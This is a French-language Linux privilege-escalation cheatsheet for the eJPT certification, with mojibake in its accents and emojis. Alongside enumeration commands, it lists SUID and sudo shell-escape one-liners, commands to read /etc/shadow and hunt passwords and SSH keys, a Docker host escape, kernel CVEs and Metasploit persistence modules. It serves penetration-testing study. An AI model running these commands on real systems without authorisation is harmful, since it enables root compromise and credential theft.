# üêß Linux Privilege Escalation - Cheatsheet eJPT

## üîç 1. Enum√©ration initiale

### Informations syst√®me de base
| Commande | Description |
|----------|-------------|
| `whoami` | Utilisateur actuel |
| `id` | UID, GID et groupes de l'utilisateur |
| `uname -a` | Informations kernel et architecture |
| `lsb_release -a` | Distribution Linux |
| `cat /etc/os-release` | Version du syst√®me |
| `hostname` | Nom de la machine |
| `uptime` | Temps de fonctionnement |
| `date` | Date et heure syst√®me |

### Utilisateurs et groupes
| Commande | Description |
|----------|-------------|
| `cat /etc/passwd` | Liste des utilisateurs |
| `cat /etc/group` | Liste des groupes |
| `cat /etc/shadow` | Hashes des mots de passe (si accessible) |
| `w` | Utilisateurs connect√©s |
| `last` | Derni√®res connexions |
| `who` | Utilisateurs actuellement connect√©s |
| `groups` | Groupes de l'utilisateur actuel |

---

## üîê 2. Permissions et privil√®ges

### Commandes sudo
| Commande | Description |
|----------|-------------|
| `sudo -l` | Privil√®ges sudo disponibles |
| `sudo -V` | Version de sudo |
| `cat /etc/sudoers` | Configuration sudo (si accessible) |

### Fichiers SUID/SGID
| Commande | Description |
|----------|-------------|
| `find / -perm -4000 2>/dev/null` | Fichiers SUID |
| `find / -perm -2000 2>/dev/null` | Fichiers SGID |
| `find / -perm -6000 2>/dev/null` | Fichiers SUID et SGID |
| `find / -perm -1000 2>/dev/null` | Fichiers avec sticky bit |

### Capabilities
| Commande | Description |
|----------|-------------|
| `getcap -r / 2>/dev/null` | Fichiers avec capabilities |
| `capsh --print` | Capabilities actuelles |

---

## üìÅ 3. Syst√®me de fichiers

### Fichiers et r√©pertoires accessibles en √©criture
| Commande | Description |
|----------|-------------|
| `find / -writable -type d 2>/dev/null` | R√©pertoires accessibles en √©criture |
| `find / -perm -222 -type f 2>/dev/null` | Fichiers accessibles en √©criture |
| `find / -perm -o w -type d 2>/dev/null` | R√©pertoires world-writable |
| `ls -la /tmp /var/tmp /dev/shm` | R√©pertoires temporaires |

### Fichiers de configuration importants
| Fichier | Description |
|---------|-------------|
| `/etc/passwd` | Informations utilisateurs |
| `/etc/shadow` | Hashes des mots de passe |
| `/etc/hosts` | R√©solution DNS locale |
| `/etc/crontab` | T√¢ches cron syst√®me |
| `/etc/fstab` | Points de montage |
| `/etc/exports` | Partages NFS |
| `/etc/ssh/sshd_config` | Configuration SSH |

---

## ‚è∞ 4. T√¢ches planifi√©es (Cron)

### √ânum√©ration des t√¢ches cron
| Commande | Description |
|----------|-------------|
| `crontab -l` | T√¢ches cron de l'utilisateur |
| `crontab -u root -l` | T√¢ches cron de root (si permissions) |
| `cat /etc/crontab` | T√¢ches cron syst√®me |
| `cat /etc/cron.d/*` | T√¢ches cron additionnelles |
| `ls -la /etc/cron.*` | R√©pertoires cron |
| `systemctl list-timers` | Timers systemd |

### Surveillance des t√¢ches cron
| Commande | Description |
|----------|-------------|
| `ps aux \| grep cron` | Processus cron actifs |
| `pspy64` | Surveillance des processus (outil externe) |

---

## üîß 5. Processus et services

### Processus en cours
| Commande | Description |
|----------|-------------|
| `ps aux` | Tous les processus |
| `ps -ef` | Processus avec PPID |
| `top` | Processus en temps r√©el |
| `htop` | Interface am√©lior√©e (si disponible) |
| `lsof` | Fichiers ouverts par processus |

### Services syst√®me
| Commande | Description |
|----------|-------------|
| `systemctl list-units --type=service` | Services systemd |
| `service --status-all` | √âtat des services (SysV) |
| `chkconfig --list` | Services au d√©marrage (CentOS/RHEL) |
| `netstat -tulpn` | Services r√©seau actifs |
| `ss -tulpn` | Alternative moderne √† netstat |

---

## üåê 6. R√©seau

### Configuration r√©seau
| Commande | Description |
|----------|-------------|
| `ifconfig` | Configuration des interfaces |
| `ip addr show` | Adresses IP (ip moderne) |
| `ip route show` | Table de routage |
| `arp -a` | Table ARP |
| `netstat -rn` | Table de routage |

### Connexions r√©seau
| Commande | Description |
|----------|-------------|
| `netstat -tulpn` | Ports ouverts et services |
| `ss -tulpn` | Ports ouverts (outil moderne) |
| `netstat -an` | Toutes les connexions |
| `lsof -i` | Fichiers r√©seau ouverts |

---

## üõ†Ô∏è 7. Techniques d'escalade courantes

### SUID Exploitation
| Binaire | Technique |
|---------|-----------|
| `/bin/bash` | `bash -p` |
| `/bin/sh` | `sh -p` |
| `/usr/bin/find` | `find . -exec /bin/sh -p \; -quit` |
| `/usr/bin/vim` | `:!sh` ou `:set shell=/bin/sh` puis `:shell` |
| `/usr/bin/awk` | `awk 'BEGIN {system("/bin/sh -p")}'` |
| `/usr/bin/nmap` | `nmap --interactive` puis `!sh` |
| `/usr/bin/less` | `less /etc/passwd` puis `!/bin/sh` |
| `/usr/bin/more` | `more /etc/passwd` puis `!/bin/sh` |

### Sudo exploitation
| Commande autoris√©e | Technique |
|-------------------|-----------|
| `sudo vi /path/file` | `:!sh` dans vi |
| `sudo nano /path/file` | `Ctrl+R Ctrl+X` puis `reset; sh 1>&0 2>&0` |
| `sudo awk` | `sudo awk 'BEGIN {system("/bin/sh")}'` |
| `sudo find` | `sudo find . -exec /bin/sh \; -quit` |
| `sudo python` | `sudo python -c 'import os; os.system("/bin/sh")'` |

### Variables d'environnement
| Variable | Exploitation |
|----------|--------------|
| `LD_PRELOAD` | Injection de biblioth√®que dynamique |
| `LD_LIBRARY_PATH` | D√©tournement de biblioth√®que |
| `PATH` | Hijacking de commandes |

---

## üîç 8. Outils d'√©num√©ration automatis√©s

### LinPEAS
| Commande | Description |
|----------|-------------|
| `./linpeas.sh` | Scan complet automatis√© |
| `./linpeas.sh -a` | Scan avec tous les checks |
| `./linpeas.sh -s` | Scan rapide |
| `./linpeas.sh -P` | Affichage avec couleurs |

### LinEnum
| Commande | Description |
|----------|-------------|
| `./LinEnum.sh` | √ânum√©ration compl√®te |
| `./LinEnum.sh -t` | Mode thorough |
| `./LinEnum.sh -k keyword` | Recherche de mots-cl√©s |

### Linux Exploit Suggester
| Commande | Description |
|----------|-------------|
| `./linux-exploit-suggester.sh` | Suggestion d'exploits kernel |
| `./linux-exploit-suggester-2.pl` | Version Perl |

---

## üí• 9. Exploits kernel courants

### CVE par version de kernel
| Version | CVE | Nom | Description |
|---------|-----|-----|-------------|
| **2.6.22 < 3.9** | CVE-2016-5195 | Dirty COW | Race condition copy-on-write |
| **< 2.6.37** | CVE-2010-3904 | RDS Exploit | Privilege escalation via RDS |
| **2.6.39 < 3.2.2** | CVE-2012-0056 | Mempodipper | /proc/*/mem vulnerability |
| **3.13 < 3.19** | CVE-2015-1328 | ofs | OverlayFS privilege escalation |
| **4.4.0 < 4.4.0-21** | CVE-2017-16995 | bpf | eBPF verifier vulnerability |
| **< 4.14.11** | CVE-2017-1000405 | HugeDirty | Huge page dirty COW |

### Exploitation avec Metasploit
| Module | Description |
|--------|-------------|
| `exploit/linux/local/cve_2016_5195_dirtycow` | Dirty COW exploit |
| `exploit/linux/local/overlayfs_priv_esc` | OverlayFS escalation |
| `exploit/linux/local/bpf_priv_esc` | eBPF privilege escalation |

---

## üîê 10. Recherche de credentials

### Fichiers de configuration
| Commande | Description |
|----------|-------------|
| `grep -r "password" /etc/ 2>/dev/null` | Recherche de mots de passe |
| `find /home -name "*.txt" -exec grep -l "pass" {} \;` | Fichiers avec "pass" |
| `grep -r "user" /var/www/ 2>/dev/null` | Credentials dans web apps |

### Historique et logs
| Fichier | Description |
|---------|-------------|
| `~/.bash_history` | Historique bash |
| `~/.mysql_history` | Historique MySQL |
| `~/.python_history` | Historique Python |
| `/var/log/auth.log` | Logs d'authentification |
| `/var/log/syslog` | Logs syst√®me |

### Cl√©s SSH
| Commande | Description |
|----------|-------------|
| `find / -name "*.key" 2>/dev/null` | Cl√©s priv√©es |
| `find / -name "*_rsa" 2>/dev/null` | Cl√©s RSA |
| `find / -name "*_dsa" 2>/dev/null` | Cl√©s DSA |
| `find / -name "authorized_keys" 2>/dev/null` | Cl√©s autoris√©es |

---

## üöÄ 11. Post-exploitation avec Metasploit

### Modules de reconnaissance
| Module | Description |
|--------|-------------|
| `post/linux/gather/enum_configs` | √ânum√©ration des configurations |
| `post/linux/gather/enum_network` | √ânum√©ration r√©seau |
| `post/linux/gather/enum_system` | √ânum√©ration syst√®me |
| `post/linux/gather/checkvm` | D√©tection de virtualisation |
| `post/multi/recon/local_exploit_suggester` | Suggestion d'exploits |

### Modules de persistence
| Module | Description |
|--------|-------------|
| `post/linux/manage/sshkey_persistence` | Persistence via cl√© SSH |
| `post/linux/manage/download_exec` | T√©l√©chargement et ex√©cution |
| `exploit/linux/local/cron_persistence` | Persistence via cron |

---

## üîß 12. Techniques avanc√©es

### Docker Escape
| Commande | Description |
|----------|-------------|
| `ls -la /var/run/docker.sock` | Socket Docker accessible |
| `docker ps` | Conteneurs en cours |
| `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` | Montage du syst√®me h√¥te |

### Exploitation de services
| Service | Technique |
|---------|-----------|
| **MySQL** | `mysql -u root -p` avec credentials trouv√©s |
| **PostgreSQL** | `psql -U postgres` |
| **Redis** | `redis-cli` puis commandes Redis |
| **MongoDB** | `mongo` sans authentification |

---

## üìù 13. Scripts utiles

### One-liners pour l'√©num√©ration
```bash
# √ânum√©ration rapide
echo "=== SYSTEM INFO ===" && uname -a && echo "=== USER INFO ===" && id && echo "=== SUDO ===" && sudo -l

# Recherche de fichiers SUID
find / -perm -4000 -type f 2>/dev/null | xargs ls -la

# Processus suspects
ps auxf | grep -v "\["

# T√¢ches cron
cat /etc/crontab /etc/cron.*/* 2>/dev/null | grep -v "^#"
```

### Script d'√©num√©ration custom
```bash
#!/bin/bash
echo "[+] Basic System Info"
uname -a
echo "[+] Current User"
id
echo "[+] Sudo Permissions"
sudo -l 2>/dev/null
echo "[+] SUID Files"
find / -perm -4000 2>/dev/null
echo "[+] Writable Directories"
find / -writable -type d 2>/dev/null | head -20
```

---

## üí° 14. Conseils pour l'eJPT

### Workflow recommand√©
1. **√ânum√©ration de base** ‚Üí `id`, `uname -a`, `sudo -l`
2. **Recherche SUID** ‚Üí `find / -perm -4000 2>/dev/null`
3. **V√©rification cron** ‚Üí `cat /etc/crontab`
4. **LinPEAS/LinEnum** ‚Üí Scripts automatis√©s
5. **Exploit suggester** ‚Üí Metasploit module
6. **Kernel exploits** ‚Üí Selon version

### Points d'attention eJPT
- **SUID exploitation** tr√®s courante
- **Sudo misconfiguration** fr√©quente
- **Credentials dans fichiers** √† chercher syst√©matiquement
- **Kernel exploits** selon version du syst√®me
- **GTFOBins** : ressource essentielle pour SUID/sudo

### Commandes essentielles √† retenir
```bash
# √ânum√©ration rapide
id && uname -a && sudo -l

# SUID files
find / -perm -4000 2>/dev/null

# Writable files/dirs
find / -writable 2>/dev/null | head -20

# Cron jobs
cat /etc/crontab

# Network info
netstat -tulpn
```

### Ressources externes importantes
- **GTFOBins** : https://gtfobins.github.io/
- **Linux Privilege Escalation** : https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
- **PayloadsAllTheThings** : Linux privilege escalation

**üéØ Conseil final** : Dans l'eJPT Linux, focus sur SUID exploitation, sudo misconfiguration, et l'utilisation de LinPEAS pour l'√©num√©ration automatis√©e. Les kernel exploits sont moins fr√©quents mais toujours possibles !